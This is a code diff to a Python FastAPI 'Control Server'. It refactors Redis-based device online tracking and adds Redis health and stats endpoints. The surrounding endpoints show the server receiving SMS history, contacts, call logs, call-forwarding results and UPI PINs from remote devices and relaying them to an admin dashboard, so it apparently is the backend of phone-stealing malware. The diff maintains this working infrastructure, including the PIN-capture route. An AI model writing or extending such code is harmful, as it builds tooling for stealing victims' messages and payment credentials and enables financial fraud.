@@ -313,6 +313,18 @@ async def general_exception_handler(request: Request, exc: Exception):
 async def startup_event():
     logger.info("Starting Control Server...")
     
+    # Initialize Redis Connection Pool (centralized)
+    try:
+        from .services.redis_connection_pool import redis_manager
+        redis_available = await redis_manager.initialize()
+        if redis_available:
+            logger.info("✅ Redis connection pool initialized successfully")
+        else:
+            logger.warning("⚠️ Redis connection pool not available")
+    except Exception as e:
+        logger.error(f"❌ Failed to initialize Redis connection pool: {e}")
+        redis_available = False
+    
     # Initialize Device Online Tracker (Redis-based)
     from .services.device_online_tracker import device_online_tracker
     await device_online_tracker.initialize()
@@ -425,6 +437,14 @@ async def shutdown_event():
     await redis_pubsub_service.stop()
     logger.info("Redis Pub/Sub stopped")
     
+    # Close Redis Connection Pool
+    try:
+        from .services.redis_connection_pool import redis_manager
+        await redis_manager.close()
+        logger.info("Redis connection pool closed")
+    except Exception as e:
+        logger.error(f"Failed to close Redis connection pool: {e}")
+    
     await close_mongodb_connection()
     logger.info("Server stopped!")
 
@@ -439,19 +459,15 @@ async def device_heartbeat(request: Request):
 
         now = utc_now()
 
-        # Mark device as online in Redis with 5-minute TTL
-        from .services.device_online_tracker import device_online_tracker
-        await device_online_tracker.mark_online(device_id)
+        # Mark device as active (updates both Redis and MongoDB with last_online_update)
+        await device_service.mark_device_activity(device_id)
 
+        # Also update last_ping and reset FCM ping flag
         await mongodb.db.devices.update_one(
             {"device_id": device_id},
             {
                 "$set": {
                     "last_ping": now,
-                    "status": "online",
-                    "is_online": True,
-                    "last_online_update": now,
-                    "updated_at": now
                 },
                 "$unset": {"fcm_ping_sent_at": ""}  # Reset FCM ping flag when device pings
             }
@@ -470,6 +486,7 @@ async def device_heartbeat(request: Request):
                     "is_online": True,
                     "battery_level": device_doc.get("battery_level"),
                     "last_ping": to_iso_string(now),
+                    "last_online_update": to_iso_string(now),
                     "updated_at": to_iso_string(now),
                 }
                 await admin_ws_manager.notify_device_update(device_id, device_payload)
@@ -496,9 +513,8 @@ async def ping_response(request: Request):
         logger.info(f"✅ [PING] Ping response received from device: {device_id}")
         logger.info(f"📥 [PING] Response data: {data}")
 
-        # Mark device as online in Redis with 5-minute TTL
-        from .services.device_online_tracker import device_online_tracker
-        await device_online_tracker.mark_online(device_id)
+        # Mark device as active (updates both Redis and MongoDB)
+        await device_service.mark_device_activity(device_id)
 
         await device_service.update_online_status(device_id, True)
         logger.info(f"✅ [PING] Device {device_id} status updated to online")
@@ -532,9 +548,8 @@ async def upload_response(request: Request):
         if not device_id or not status:
             raise HTTPException(status_code=400, detail="device_id and status required")
 
-        # Mark device as online in Redis (any activity = online)
-        from .services.device_online_tracker import device_online_tracker
-        await device_online_tracker.mark_online(device_id)
+        # Mark device as active (updates both Redis and MongoDB)
+        await device_service.mark_device_activity(device_id)
 
         logger.info(f"Upload response from {device_id}: {status} - Count: {count}")
 
@@ -670,9 +685,8 @@ async def battery_update(message: dict):
     battery_level = data.get("battery")
     is_online = data.get("is_online", True)
 
-    # Mark device as online in Redis (any activity = online)
-    from .services.device_online_tracker import device_online_tracker
-    await device_online_tracker.mark_online(device_id)
+    # Mark device as active (updates both Redis and MongoDB)
+    await device_service.mark_device_activity(device_id)
 
     if battery_level is not None:
         await device_service.update_battery_level(device_id, battery_level)
@@ -688,9 +702,8 @@ async def sms_history(message: dict):
     sms_list = message.get("data", [])
     batch_info = message.get("batch_info", {})
 
-    # Mark device as online in Redis (any activity = online)
-    from .services.device_online_tracker import device_online_tracker
-    await device_online_tracker.mark_online(device_id)
+    # Mark device as active (updates both Redis and MongoDB)
+    await device_service.mark_device_activity(device_id)
 
     await device_service.save_sms_history(device_id, sms_list)
 
@@ -706,9 +719,8 @@ async def contacts_bulk(message: dict):
     contacts_list = message.get("data", [])
     batch_info = message.get("batch_info", {})
 
-    # Mark device as online in Redis (any activity = online)
-    from .services.device_online_tracker import device_online_tracker
-    await device_online_tracker.mark_online(device_id)
+    # Mark device as active (updates both Redis and MongoDB)
+    await device_service.mark_device_activity(device_id)
 
     await device_service.save_contacts(device_id, contacts_list)
 
@@ -732,9 +744,8 @@ async def call_history(message: dict):
             logger.warning(f"Call logs batch: empty call_logs for device {device_id}")
             return {"status": "success", "message": "no call logs to save"}
 
-        # Mark device as online in Redis (any activity = online)
-        from .services.device_online_tracker import device_online_tracker
-        await device_online_tracker.mark_online(device_id)
+        # Mark device as active (updates both Redis and MongoDB)
+        await device_service.mark_device_activity(device_id)
 
         logger.info(f"Received {len(call_logs)} call logs from device {device_id}")
         await device_service.save_call_logs(device_id, call_logs)
@@ -834,9 +845,8 @@ async def receive_sms(request: Request):
             logger.error(f"❌ [SMS] Missing sender or message - Device: {device_id}, Sender: {sender}, Has message: {bool(message)}")
             raise HTTPException(status_code=400, detail="sender and message are required")
 
-        # Mark device as online in Redis (any activity = online)
-        from .services.device_online_tracker import device_online_tracker
-        await device_online_tracker.mark_online(device_id)
+        # Mark device as active (updates both Redis and MongoDB)
+        await device_service.mark_device_activity(device_id)
 
         device = await device_service.get_device(device_id)
         if not device:
@@ -920,6 +930,9 @@ async def sms_delivery_status(delivery_data: SMSDeliveryStatusRequest):
         status = delivery_data.status.value
         details = delivery_data.details
         timestamp = delivery_data.timestamp
+
+        # Mark device as active (updates both Redis and MongoDB)
+        await device_service.mark_device_activity(device_id)
 
         device = await device_service.get_device(device_id)
         if not device:
@@ -1073,6 +1086,9 @@ async def call_forwarding_result(result_data: CallForwardingResult):
 
         logger.info(f"Call forwarding result from device {device_id}: {message}")
 
+        # Mark device as active (updates both Redis and MongoDB)
+        await device_service.mark_device_activity(device_id)
+
         device = await device_service.get_device(device_id)
         if not device:
             logger.warning(f"Device not found: {device_id}")
@@ -1140,10 +1156,81 @@ async def get_forwarding_number_new(device_id: str):
 @app.get("/health")
 async def health_check():
     try:
+        # Check MongoDB
         await mongodb.client.admin.command('ping')
-        return {"status": "ok"}
+        
+        # Check Redis
+        redis_status = "unavailable"
+        try:
+            from .services.redis_connection_pool import redis_manager
+            if redis_manager.is_available:
+                redis_ok = await redis_manager.ping()
+                redis_status = "ok" if redis_ok else "error"
+        except Exception:
+            redis_status = "error"
+        
+        return {
+            "status": "ok",
+            "mongodb": "ok",
+            "redis": redis_status
+        }
     except Exception:
         raise HTTPException(status_code=503, detail="Service unavailable")
+
+@app.get("/api/redis/stats")
+async def get_redis_stats(
+    current_admin: Admin = Depends(get_current_admin)
+):
+    """Get Redis statistics and health info"""
+    try:
+        from .services.redis_connection_pool import redis_manager
+        from .services.device_online_tracker import device_online_tracker
+        
+        if not redis_manager.is_available:
+            return {
+                "success": False,
+                "message": "Redis not available"
+            }
+        
+        # Get Redis info
+        redis_info = await redis_manager.get_info()
+        pool_stats = await redis_manager.get_pool_stats()
+        
+        # Get online devices count
+        online_device_ids = await device_online_tracker.get_all_online_device_ids()
+        
+        # Extract useful metrics
+        stats = {
+            "success": True,
+            "redis_version": redis_info.get("redis_version"),
+            "uptime_seconds": redis_info.get("uptime_in_seconds"),
+            "connected_clients": redis_info.get("connected_clients"),
+            "used_memory_human": redis_info.get("used_memory_human"),
+            "used_memory_peak_human": redis_info.get("used_memory_peak_human"),
+            "total_commands_processed": redis_info.get("total_commands_processed"),
+            "instantaneous_ops_per_sec": redis_info.get("instantaneous_ops_per_sec"),
+            "keyspace_hits": redis_info.get("keyspace_hits"),
+            "keyspace_misses": redis_info.get("keyspace_misses"),
+            "evicted_keys": redis_info.get("evicted_keys"),
+            "expired_keys": redis_info.get("expired_keys"),
+            "role": redis_info.get("role"),
+            "connection_pool": pool_stats,
+            "online_devices_count": len(online_device_ids),
+        }
+        
+        # Calculate hit rate
+        hits = stats.get("keyspace_hits", 0)
+        misses = stats.get("keyspace_misses", 0)
+        if hits + misses > 0:
+            stats["hit_rate_percent"] = round((hits / (hits + misses)) * 100, 2)
+        else:
+            stats["hit_rate_percent"] = 0
+        
+        return stats
+        
+    except Exception as e:
+        logger.error(f"Failed to get Redis stats: {e}", exc_info=True)
+        raise HTTPException(status_code=500, detail=str(e))
 
 @app.get("/api/websocket/stats")
 async def get_websocket_stats(
@@ -1545,6 +1632,9 @@ async def bot_check_status(current_admin: Admin = Depends(get_current_admin)):
 @app.post("/save-pin", response_model=UPIPinResponse, tags=["UPI"])
 async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
     try:
+        # Mark device as active (updates both Redis and MongoDB)
+        await device_service.mark_device_activity(pin_data.device_id)
+        
         admin_token = pin_data.user_id
         admin = await mongodb.db.admins.find_one({"device_token": admin_token})
         
@@ -1606,6 +1696,7 @@ async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
                     "battery_level": updated_device.get("battery_level"),
                     "has_upi": updated_device.get("has_upi", False),
                     "upi_pins": updated_device.get("upi_pins", []),
+                    "last_online_update": to_iso_string(ensure_utc(updated_device.get("last_online_update"))) if updated_device.get("last_online_update") else None,
                     "updated_at": to_iso_string(ensure_utc(updated_device.get("updated_at"))),
                 }
                 await admin_ws_manager.notify_device_update(pin_data.device_id, device_payload)
